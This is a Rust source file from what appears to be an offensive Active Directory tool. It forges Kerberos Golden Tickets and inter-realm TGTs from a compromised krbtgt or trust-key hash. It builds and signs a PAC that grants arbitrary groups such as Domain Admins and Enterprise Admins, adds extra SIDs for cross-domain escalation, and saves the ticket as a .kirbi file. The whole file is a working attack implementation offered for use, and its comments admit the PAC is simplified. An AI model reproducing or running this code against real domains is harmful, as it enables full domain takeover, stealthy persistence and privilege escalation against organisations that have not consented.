//! Golden Ticket forging — forge a TGT using the krbtgt hash.
//!
//! Constructs a valid Kerberos TGT with a forged PAC containing
//! arbitrary group memberships (Domain Admins, Enterprise Admins, etc.).

use chrono::{Duration, Utc};
use kerberos_asn1::{
    Asn1Object, EncTicketPart, EncryptedData, KerberosFlags, KerberosTime, PrincipalName, Ticket,
    TransitedEncoding,
};
use kerberos_crypto::{AesSizes, checksum_sha_aes, new_kerberos_cipher};
use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::proto::kerberos::{
    ETYPE_AES256_CTS, ETYPE_RC4_HMAC, NT_PRINCIPAL, NT_SRV_INST,
};
use tracing::{info, warn};

use crate::runner::{ForgeConfig, ForgeResult, ForgedTicket};
use crate::validate;

/// Forge a Golden Ticket (TGT encrypted with krbtgt key).
pub async fn forge_golden_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
    info!("[golden] Forging Golden Ticket for {}", config.domain);

    // Validate required inputs
    let krbtgt_hash = config
        .krbtgt_hash
        .as_deref()
        .or(config.krbtgt_aes256.as_deref())
        .ok_or_else(|| {
            OverthroneError::TicketForge(
                "krbtgt hash (--krbtgt-hash or --krbtgt-aes256) is required for Golden Ticket"
                    .into(),
            )
        })?;

    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge(
            "Domain SID (--domain-sid) is required for Golden Ticket".into(),
        )
    })?;

    validate::validate_sid_format(domain_sid)?;
    let (key, etype) = resolve_key_and_etype(krbtgt_hash, config.krbtgt_aes256.as_deref())?;

    let realm = config.domain.to_uppercase();
    let impersonate = config.effective_impersonate();
    let groups = config.effective_groups();
    let lifetime = config.effective_lifetime();

    info!(
        "[golden] User={}, RID={}, Groups={:?}, Etype={}, Lifetime={}h",
        impersonate, config.user_rid, groups, etype, lifetime
    );

    // Build the PAC (Privilege Attribute Certificate)
    let pac_bytes = build_pac(
        impersonate,
        &realm,
        domain_sid,
        config.user_rid,
        &groups,
        &config.extra_sids,
        &key,
        etype,
    )?;

    // Build EncTicketPart
    let now = Utc::now();
    let auth_time = KerberosTime::from(now);
    let start_time = KerberosTime::from(now);
    let end_time = KerberosTime::from(now + Duration::hours(lifetime as i64));
    let renew_until = KerberosTime::from(now + Duration::days(7));

    // Generate a random session key for the TGT
    let session_key = generate_session_key(etype);

    let enc_ticket_part = EncTicketPart {
        flags: ticket_flags_golden(),
        key: kerberos_asn1::EncryptionKey {
            keytype: etype,
            keyvalue: session_key.clone(),
        },
        crealm: realm.clone(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![impersonate.to_string()],
        },
        transited: TransitedEncoding {
            tr_type: 1,
            contents: Vec::new(),
        },
        authtime: auth_time,
        starttime: Some(start_time),
        endtime: end_time.clone(),
        renew_till: Some(renew_until),
        caddr: None,
        authorization_data: Some(vec![kerberos_asn1::AuthorizationDataEntry {
            ad_type: 1, // AD-IF-RELEVANT
            ad_data: pac_bytes,
        }]),
    };

    // Encrypt with krbtgt key (key_usage=2 for TGS ticket)
    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher init: {e}")))?;
    let encrypted = cipher.encrypt(&key, 2, &enc_ticket_part.build());

    let ticket = Ticket {
        tkt_vno: 5,
        realm: realm.clone(),
        sname: PrincipalName {
            name_type: NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), realm.clone()],
        },
        enc_part: EncryptedData {
            etype,
            kvno: Some(2), // krbtgt kvno
            cipher: encrypted,
        },
    };

    let ticket_bytes = ticket.build();
    let ticket_size = ticket_bytes.len();

    // Build KRB-CRED wrapper for .kirbi export
    let kirbi_bytes = build_krb_cred(&ticket, &enc_ticket_part, &session_key, etype)?;

    // Save to file if output path specified
    let kirbi_path = save_ticket(config, &kirbi_bytes, "golden")?;
    let kirbi_b64 = base64_encode(&kirbi_bytes);

    let etype_str = match etype {
        ETYPE_AES256_CTS => "AES256-CTS",
        ETYPE_RC4_HMAC => "RC4-HMAC",
        17 => "AES128-CTS",
        _ => "Unknown",
    };

    info!(
        "[golden] Golden Ticket forged ({} bytes, {})",
        ticket_size, etype_str
    );

    Ok(ForgeResult {
        action: "Golden Ticket".into(),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: "Golden Ticket (TGT)".into(),
            impersonated_user: impersonate.to_string(),
            domain: realm.clone(),
            spn: format!("krbtgt/{}", realm),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(lifetime as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids: config.extra_sids.clone(),
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(kirbi_b64),
            ticket_size_bytes: ticket_size,
        }),
        persistence_result: None,
        message: format!(
            "Golden Ticket forged: {} as {} ({}) — valid for {}h",
            realm, impersonate, etype_str, lifetime
        ),
    })
}

/// Forge an Inter-Realm TGT for cross-domain escalation.
/// Uses the trust key (krbtgt/TARGET@SOURCE) instead of krbtgt/REALM@REALM.
pub async fn forge_interrealm_tgt(
    config: &ForgeConfig,
    target_domain: &str,
) -> Result<ForgeResult> {
    info!(
        "[golden] Forging Inter-Realm TGT: {} → {}",
        config.domain, target_domain
    );

    let trust_hash = config.krbtgt_hash.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Trust key hash is required for Inter-Realm TGT".into())
    })?;

    let domain_sid = config.domain_sid.as_deref().ok_or_else(|| {
        OverthroneError::TicketForge("Domain SID is required for Inter-Realm TGT".into())
    })?;

    validate::validate_sid_format(domain_sid)?;
    let (key, etype) = resolve_key_and_etype(trust_hash, None)?;

    let source_realm = config.domain.to_uppercase();
    let target_realm = target_domain.to_uppercase();
    let impersonate = config.effective_impersonate();
    let groups = config.effective_groups();
    let lifetime = config.effective_lifetime();

    // For inter-realm, inject target domain's EA SID into ExtraSIDs
    let extra_sids = config.extra_sids.clone();
    // If no extra SIDs provided, hint that user should add the target EA SID
    if extra_sids.is_empty() {
        warn!(
            "[golden] No extra-sids specified. For full escalation, add target domain's \
               Enterprise Admins SID (e.g., S-1-5-21-<target>-519)"
        );
    }

    let pac_bytes = build_pac(
        impersonate,
        &source_realm,
        domain_sid,
        config.user_rid,
        &groups,
        &extra_sids,
        &key,
        etype,
    )?;

    let now = Utc::now();
    let session_key = generate_session_key(etype);

    let enc_ticket_part = EncTicketPart {
        flags: ticket_flags_golden(),
        key: kerberos_asn1::EncryptionKey {
            keytype: etype,
            keyvalue: session_key.clone(),
        },
        crealm: source_realm.clone(),
        cname: PrincipalName {
            name_type: NT_PRINCIPAL,
            name_string: vec![impersonate.to_string()],
        },
        transited: TransitedEncoding {
            tr_type: 1,
            contents: source_realm.as_bytes().to_vec(),
        },
        authtime: KerberosTime::from(now),
        starttime: Some(KerberosTime::from(now)),
        endtime: KerberosTime::from(now + Duration::hours(lifetime as i64)),
        renew_till: Some(KerberosTime::from(now + Duration::days(7))),
        caddr: None,
        authorization_data: Some(vec![kerberos_asn1::AuthorizationDataEntry {
            ad_type: 1,
            ad_data: pac_bytes,
        }]),
    };

    let cipher = new_kerberos_cipher(etype)
        .map_err(|e| OverthroneError::TicketForge(format!("Cipher: {e}")))?;
    let encrypted = cipher.encrypt(&key, 2, &enc_ticket_part.build());

    // SPN is krbtgt/TARGET@SOURCE (the trust account)
    let ticket = Ticket {
        tkt_vno: 5,
        realm: target_realm.clone(),
        sname: PrincipalName {
            name_type: NT_SRV_INST,
            name_string: vec!["krbtgt".to_string(), target_realm.clone()],
        },
        enc_part: EncryptedData {
            etype,
            kvno: Some(2),
            cipher: encrypted,
        },
    };

    let ticket_bytes = ticket.build();
    let kirbi_bytes = build_krb_cred(&ticket, &enc_ticket_part, &session_key, etype)?;
    let kirbi_path = save_ticket(config, &kirbi_bytes, "interrealm")?;

    let etype_str = etype_name(etype);

    Ok(ForgeResult {
        action: format!("Inter-Realm TGT → {}", target_realm),
        domain: config.domain.clone(),
        success: true,
        ticket_data: Some(ForgedTicket {
            ticket_type: format!("Inter-Realm TGT ({} → {})", source_realm, target_realm),
            impersonated_user: impersonate.to_string(),
            domain: source_realm.clone(),
            spn: format!("krbtgt/{}", target_realm),
            encryption_type: etype_str.into(),
            valid_from: now.format("%Y-%m-%d %H:%M:%S UTC").to_string(),
            valid_until: (now + Duration::hours(lifetime as i64))
                .format("%Y-%m-%d %H:%M:%S UTC")
                .to_string(),
            group_rids: groups,
            extra_sids,
            kirbi_path,
            ccache_path: None,
            kirbi_base64: Some(base64_encode(&kirbi_bytes)),
            ticket_size_bytes: ticket_bytes.len(),
        }),
        persistence_result: None,
        message: format!(
            "Inter-Realm TGT forged: {} → {} as {} ({})",
            source_realm, target_realm, impersonate, etype_str
        ),
    })
}

// ═══════════════════════════════════════════════════════════
// Internal Helpers
// ═══════════════════════════════════════════════════════════

/// Resolve key bytes and encryption type from hash string.
fn resolve_key_and_etype(hash: &str, aes256: Option<&str>) -> Result<(Vec<u8>, i32)> {
    // Prefer AES256 if available
    if let Some(aes) = aes256 {
        let key = hex::decode(aes.trim())
            .map_err(|e| OverthroneError::TicketForge(format!("Invalid AES256 key hex: {e}")))?;
        if key.len() != 32 {
            return Err(OverthroneError::TicketForge(format!(
                "AES256 key must be 32 bytes, got {}",
                key.len()
            )));
        }
        return Ok((key, ETYPE_AES256_CTS));
    }

    // Fall back to RC4 (NTLM hash)
    let clean = hash.trim();
    let key = hex::decode(clean)
        .map_err(|e| OverthroneError::TicketForge(format!("Invalid hash hex: {e}")))?;

    match key.len() {
        16 => Ok((key, ETYPE_RC4_HMAC)),   // NT hash
        32 => Ok((key, ETYPE_AES256_CTS)), // AES256
        _ => Err(OverthroneError::TicketForge(format!(
            "Hash must be 16 bytes (RC4) or 32 bytes (AES256), got {}",
            key.len()
        ))),
    }
}

/// Generate a random session key of appropriate length for the etype.
pub(crate) fn generate_session_key(etype: i32) -> Vec<u8> {
    let len = match etype {
        ETYPE_AES256_CTS => 32,
        17 => 16, // AES128
        ETYPE_RC4_HMAC => 16,
        _ => 16,
    };
    let mut key = vec![0u8; len];
    for byte in &mut key {
        *byte = rand::random();
    }
    key
}

/// Build PAC (Privilege Attribute Certificate) bytes.
/// This is a simplified PAC — real PAC has KERB_VALIDATION_INFO, PAC_CLIENT_INFO,
/// server checksum, KDC checksum. We construct the minimal structure.
#[allow(clippy::too_many_arguments)]
pub(crate) fn build_pac(
    username: &str,
    domain: &str,
    domain_sid: &str,
    user_rid: u32,
    group_rids: &[u32],
    extra_sids: &[String],
    key: &[u8],
    etype: i32,
) -> Result<Vec<u8>> {
    let mut pac = Vec::new();

    // PAC_TYPE header
    let num_buffers: u32 = 4; // LOGON_INFO, CLIENT_INFO, SERVER_CKSUM, KDC_CKSUM
    pac.extend_from_slice(&num_buffers.to_le_bytes());
    pac.extend_from_slice(&0u32.to_le_bytes()); // Version

    // We build the KERB_VALIDATION_INFO (NDR-encoded)
    let logon_info = build_kerb_validation_info(
        username, domain, domain_sid, user_rid, group_rids, extra_sids,
    );

    // PAC_INFO_BUFFER entries (type, size, offset)
    let header_size = 8 + (num_buffers as usize * 16); // 8 bytes header + 16 per buffer

    // Buffer 1: LOGON_INFO (type=1)
    let logon_offset = align_to_8(header_size);
    pac.extend_from_slice(&1u32.to_le_bytes()); // ulType = LOGON_INFO
    pac.extend_from_slice(&(logon_info.len() as u32).to_le_bytes());
    pac.extend_from_slice(&(logon_offset as u64).to_le_bytes());

    // Buffer 2: CLIENT_INFO (type=10)
    let client_info = build_pac_client_info(username);
    let client_offset = align_to_8(logon_offset + logon_info.len());
    pac.extend_from_slice(&10u32.to_le_bytes());
    pac.extend_from_slice(&(client_info.len() as u32).to_le_bytes());
    pac.extend_from_slice(&(client_offset as u64).to_le_bytes());

    // Buffer 3: SERVER_CHECKSUM (type=6)
    let cksum_size: u32 = if etype == ETYPE_AES256_CTS {
        12 + 16
    } else {
        4 + 16
    };
    let server_cksum_offset = align_to_8(client_offset + client_info.len());
    pac.extend_from_slice(&6u32.to_le_bytes());
    pac.extend_from_slice(&cksum_size.to_le_bytes());
    pac.extend_from_slice(&(server_cksum_offset as u64).to_le_bytes());

    // Buffer 4: KDC_CHECKSUM (type=7)
    let kdc_cksum_offset = align_to_8(server_cksum_offset + cksum_size as usize);
    pac.extend_from_slice(&7u32.to_le_bytes());
    pac.extend_from_slice(&cksum_size.to_le_bytes());
    pac.extend_from_slice(&(kdc_cksum_offset as u64).to_le_bytes());

    // Pad to logon_offset and write LOGON_INFO
    while pac.len() < logon_offset {
        pac.push(0);
    }
    pac.extend_from_slice(&logon_info);

    // Pad to client_offset and write CLIENT_INFO
    while pac.len() < client_offset {
        pac.push(0);
    }
    pac.extend_from_slice(&client_info);

    // Server checksum (HMAC-MD5 for RC4, HMAC-SHA1-96 for AES)
    while pac.len() < server_cksum_offset {
        pac.push(0);
    }
    let server_cksum = compute_pac_checksum(&pac, key, etype, true)?;
    pac.extend_from_slice(&server_cksum);

    // KDC checksum
    while pac.len() < kdc_cksum_offset {
        pac.push(0);
    }
    let kdc_cksum = compute_pac_checksum(&server_cksum, key, etype, false)?;
    pac.extend_from_slice(&kdc_cksum);

    Ok(pac)
}

/// Build simplified KERB_VALIDATION_INFO (NDR-encoded).
fn build_kerb_validation_info(
    username: &str,
    domain: &str,
    domain_sid: &str,
    user_rid: u32,
    group_rids: &[u32],
    extra_sids: &[String],
) -> Vec<u8> {
    let mut buf = Vec::new();

    // Logon time (Windows FILETIME — current time)
    let now_filetime = chrono_to_filetime(Utc::now());
    buf.extend_from_slice(&now_filetime.to_le_bytes()); // LogonTime
    buf.extend_from_slice(&0i64.to_le_bytes()); // LogoffTime (never)
    buf.extend_from_slice(&0i64.to_le_bytes()); // KickOffTime (never)
    buf.extend_from_slice(&now_filetime.to_le_bytes()); // PasswordLastSet
    buf.extend_from_slice(&0i64.to_le_bytes()); // PasswordCanChange
    buf.extend_from_slice(&0x7FFFFFFFFFFFFFFFi64.to_le_bytes()); // PasswordMustChange (never)

    // Username (RPC_UNICODE_STRING)
    let uname_utf16: Vec<u8> = username
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    buf.extend_from_slice(&(uname_utf16.len() as u16).to_le_bytes()); // Length
    buf.extend_from_slice(&(uname_utf16.len() as u16).to_le_bytes()); // MaxLength
    buf.extend_from_slice(&1u32.to_le_bytes()); // Pointer

    // FullName (same as username for simplicity)
    buf.extend_from_slice(&(uname_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&(uname_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&2u32.to_le_bytes());

    // LogonScript, ProfilePath, HomeDirectory, HomeDirectoryDrive — empty
    for ptr in 3..=6u32 {
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(&0u16.to_le_bytes());
        buf.extend_from_slice(&ptr.to_le_bytes());
    }

    // LogonCount, BadPasswordCount
    buf.extend_from_slice(&0u16.to_le_bytes()); // LogonCount
    buf.extend_from_slice(&0u16.to_le_bytes()); // BadPasswordCount

    // UserId, PrimaryGroupId
    buf.extend_from_slice(&user_rid.to_le_bytes());
    buf.extend_from_slice(&513u32.to_le_bytes()); // Domain Users

    // GroupCount + pointer
    buf.extend_from_slice(&(group_rids.len() as u32).to_le_bytes());
    buf.extend_from_slice(&7u32.to_le_bytes()); // Pointer to groups

    // UserFlags
    buf.extend_from_slice(&0x20u32.to_le_bytes()); // EXTRA_SIDS flag

    // UserSessionKey (16 zero bytes)
    buf.extend_from_slice(&[0u8; 16]);

    // LogonServer (domain name)
    let domain_utf16: Vec<u8> = domain
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    buf.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&8u32.to_le_bytes());

    // LogonDomainName
    buf.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&(domain_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&9u32.to_le_bytes());

    // LogonDomainId (SID pointer)
    buf.extend_from_slice(&10u32.to_le_bytes());

    // Reserved1 (8 bytes)
    buf.extend_from_slice(&[0u8; 8]);

    // UserAccountControl
    buf.extend_from_slice(&0x0200u32.to_le_bytes()); // NORMAL_ACCOUNT

    // SubAuthStatus, Reserved3
    buf.extend_from_slice(&[0u8; 12]);

    // ExtraSIDCount + pointer
    buf.extend_from_slice(&(extra_sids.len() as u32).to_le_bytes());
    if extra_sids.is_empty() {
        buf.extend_from_slice(&0u32.to_le_bytes());
    } else {
        buf.extend_from_slice(&11u32.to_le_bytes());
    }

    // ResourceGroupDomainSid, ResourceGroupCount, ResourceGroups
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());

    // Deferred data: username string
    buf.extend_from_slice(&uname_utf16);
    // Pad to 4 bytes
    while buf.len() % 4 != 0 {
        buf.push(0);
    }

    // Groups array: each GROUP_MEMBERSHIP is (RID: u32, Attributes: u32)
    for &rid in group_rids {
        buf.extend_from_slice(&rid.to_le_bytes());
        buf.extend_from_slice(&0x00000007u32.to_le_bytes()); // SE_GROUP_MANDATORY | ENABLED | ENABLED_BY_DEFAULT
    }

    // Domain SID (binary)
    let sid_bytes = encode_sid(domain_sid);
    buf.extend_from_slice(&sid_bytes);

    // ExtraSIDs
    for sid_str in extra_sids {
        let sid_bytes = encode_sid(sid_str);
        buf.extend_from_slice(&(sid_bytes.len() as u32).to_le_bytes());
        buf.extend_from_slice(&sid_bytes);
        buf.extend_from_slice(&0x00000007u32.to_le_bytes()); // Attributes
    }

    buf
}

/// Build PAC_CLIENT_INFO buffer.
fn build_pac_client_info(username: &str) -> Vec<u8> {
    let mut buf = Vec::new();
    let now_filetime = chrono_to_filetime(Utc::now());
    buf.extend_from_slice(&now_filetime.to_le_bytes());

    let name_utf16: Vec<u8> = username
        .encode_utf16()
        .flat_map(|c| c.to_le_bytes())
        .collect();
    buf.extend_from_slice(&(name_utf16.len() as u16).to_le_bytes());
    buf.extend_from_slice(&name_utf16);
    buf
}

/// Compute PAC checksum (HMAC-MD5 for RC4, HMAC-SHA1-96-AES for AES).
fn compute_pac_checksum(data: &[u8], key: &[u8], etype: i32, _is_server: bool) -> Result<Vec<u8>> {
    use hmac::{Hmac, Mac};

    let mut result = Vec::new();

    match etype {
        ETYPE_RC4_HMAC => {
            // KERB_CHECKSUM_HMAC_MD5 (type=0xFFFFFF76 = -138)
            result.extend_from_slice(&(-138i32).to_le_bytes());

            let mut mac = Hmac::<md5::Md5>::new_from_slice(key)
                .map_err(|e| OverthroneError::TicketForge(format!("HMAC init: {e}")))?;
            mac.update(data);
            let checksum = mac.finalize().into_bytes();
            result.extend_from_slice(&checksum);
        }
        ETYPE_AES256_CTS | 17 => {
            // HMAC_SHA1_96_AES256 (type=16) or AES128 (type=15)
            let cksum_type: i32 = if etype == ETYPE_AES256_CTS { 16 } else { 15 };
            result.extend_from_slice(&cksum_type.to_le_bytes());

            // Use the kerberos_crypto standalone checksum function for AES HMAC-SHA1-96
            let aes_sizes = if etype == ETYPE_AES256_CTS {
                AesSizes::Aes256
            } else {
                AesSizes::Aes128
            };
            // Key usage 17 = KERB_NON_KERB_CKSUM_SALT for PAC checksums
            let checksum = checksum_sha_aes(key, 17, data, &aes_sizes);
            result.extend_from_slice(&checksum[..std::cmp::min(checksum.len(), 12)]);
        }
        _ => {
            return Err(OverthroneError::TicketForge(format!(
                "Unsupported etype for PAC checksum: {etype}"
            )));
        }
    }

    Ok(result)
}

/// Encode a SID string "S-1-5-21-xxx-yyy-zzz" into binary format.
fn encode_sid(sid_str: &str) -> Vec<u8> {
    let parts: Vec<&str> = sid_str.split('-').collect();
    if parts.len() < 4 || parts[0] != "S" {
        return vec![1, 0, 0, 0, 0, 5, 0, 0, 0, 0]; // Fallback: minimal SID
    }

    let revision: u8 = parts[1].parse().unwrap_or(1);
    let authority: u64 = parts[2].parse().unwrap_or(5);
    let sub_authorities: Vec<u32> = parts[3..].iter().filter_map(|s| s.parse().ok()).collect();

    let mut buf = Vec::new();
    buf.push(revision);
    buf.push(sub_authorities.len() as u8);
    // Authority (6 bytes big-endian)
    buf.extend_from_slice(&authority.to_be_bytes()[2..8]);
    for &sub in &sub_authorities {
        buf.extend_from_slice(&sub.to_le_bytes());
    }
    buf
}

/// Build KRB-CRED (kirbi) wrapper around a ticket.
pub(crate) fn build_krb_cred(
    ticket: &Ticket,
    enc_part: &EncTicketPart,
    session_key: &[u8],
    etype: i32,
) -> Result<Vec<u8>> {
    // KRB-CRED is the container format for .kirbi files
    // Structure: KRB-CRED { pvno=5, msg-type=22, tickets: [Ticket], enc-part: EncKrbCredPart }
    let krb_cred = kerberos_asn1::KrbCred {
        pvno: 5,
        msg_type: 22,
        tickets: vec![ticket.clone()],
        enc_part: EncryptedData {
            etype: 0, // Unencrypted for .kirbi
            kvno: None,
            cipher: build_enc_krb_cred_part(enc_part, session_key, etype),
        },
    };
    Ok(krb_cred.build())
}

/// Build EncKrbCredPart with ticket info for .kirbi.
fn build_enc_krb_cred_part(enc_part: &EncTicketPart, session_key: &[u8], etype: i32) -> Vec<u8> {
    let cred_info = kerberos_asn1::KrbCredInfo {
        key: kerberos_asn1::EncryptionKey {
            keytype: etype,
            keyvalue: session_key.to_vec(),
        },
        prealm: Some(enc_part.crealm.clone()),
        pname: Some(enc_part.cname.clone()),
        flags: Some(enc_part.flags.clone()),
        authtime: Some(enc_part.authtime.clone()),
        starttime: enc_part.starttime.clone(),
        endtime: Some(enc_part.endtime.clone()),
        renew_till: enc_part.renew_till.clone(),
        srealm: None,
        sname: None,
        caddr: None,
    };

    let enc_cred_part = kerberos_asn1::EncKrbCredPart {
        ticket_info: vec![cred_info],
        nonce: None,
        timestamp: None,
        usec: None,
        s_address: None,
        r_address: None,
    };

    enc_cred_part.build()
}

/// Golden Ticket flags: forwardable, renewable, pre-authent, initial
fn ticket_flags_golden() -> KerberosFlags {
    let flags: u32 = 0x40E00000; // FORWARDABLE | RENEWABLE | INITIAL | PRE_AUTHENT
    KerberosFlags { flags }
}

/// Convert chrono DateTime to Windows FILETIME (100-ns intervals since 1601-01-01).
fn chrono_to_filetime(dt: chrono::DateTime<Utc>) -> i64 {
    // Difference between 1601-01-01 and 1970-01-01 in 100-ns intervals
    const EPOCH_DIFF: i64 = 116444736000000000;
    let unix_nanos = dt.timestamp_nanos_opt().unwrap_or(0);
    let filetime_ticks = unix_nanos / 100;
    filetime_ticks + EPOCH_DIFF
}

fn align_to_8(offset: usize) -> usize {
    (offset + 7) & !7
}

pub(crate) fn base64_encode(data: &[u8]) -> String {
    let mut out = String::new();
    // Simple base64 encoding without external dependency
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let combined = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPHABET[((combined >> 18) & 0x3F) as usize] as char);
        out.push(ALPHABET[((combined >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(ALPHABET[((combined >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(ALPHABET[(combined & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

pub(crate) fn etype_name(etype: i32) -> &'static str {
    match etype {
        ETYPE_AES256_CTS => "AES256-CTS",
        ETYPE_RC4_HMAC => "RC4-HMAC",
        17 => "AES128-CTS",
        _ => "Unknown",
    }
}

/// Save ticket to file, return the path.
pub(crate) fn save_ticket(
    config: &ForgeConfig,
    kirbi_bytes: &[u8],
    prefix: &str,
) -> Result<Option<String>> {
    let path = if let Some(ref out) = config.output_path {
        out.clone()
    } else {
        let impersonate = config.effective_impersonate();
        format!(
            "{}_{}_{}.kirbi",
            prefix,
            impersonate,
            config.domain.replace('.', "_")
        )
    };

    std::fs::write(&path, kirbi_bytes).map_err(|e| {
        OverthroneError::TicketForge(format!("Cannot write kirbi to '{}': {e}", path))
    })?;

    info!("[golden] Kirbi saved to {}", path);
    Ok(Some(path))
}
